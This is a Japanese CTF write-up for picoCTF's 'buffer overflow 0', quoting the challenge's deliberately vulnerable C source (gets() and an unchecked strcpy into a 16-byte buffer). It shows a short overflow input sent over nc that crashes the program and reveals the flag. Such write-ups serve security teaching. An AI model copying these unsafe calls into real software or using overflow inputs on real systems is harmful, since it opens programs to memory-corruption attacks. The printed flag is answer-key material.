# picoCTF Writeup: buffer overflow 0

バッファオーバーフローしてみよう問題

- ジャンル: Binary Exploitation
- 難易度: Medium

## Writeup
問題文
>Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 64131

ソースをダウンロードしてみていきます。
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

気になるところとして、`gets()`を使っていて入力文字列チェックはされないので、大量に文字列を入力すればよさそうな感じですね。

他には`signal(SIGSEGV, sigsegv_handler);`で`SIGSEGV(Segmentation Violation)`が発生すると`sigsegv_handler()`が呼び出されflagがプリントされるようです。

`SIGSEGV`=**異常終了**なので、`char buf2[16]`の16Bytes以上の長い入力を与えて`RBP`まで溢れさせてやればクラッシュしそうですね。

実際にサーバーに接続してみます。
```
ozaki@NucBoxM5PLUS:~/project/picoCTF$ nc saturn.picoctf.net 64131
Input: 12345678901234567890
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
flagとれました。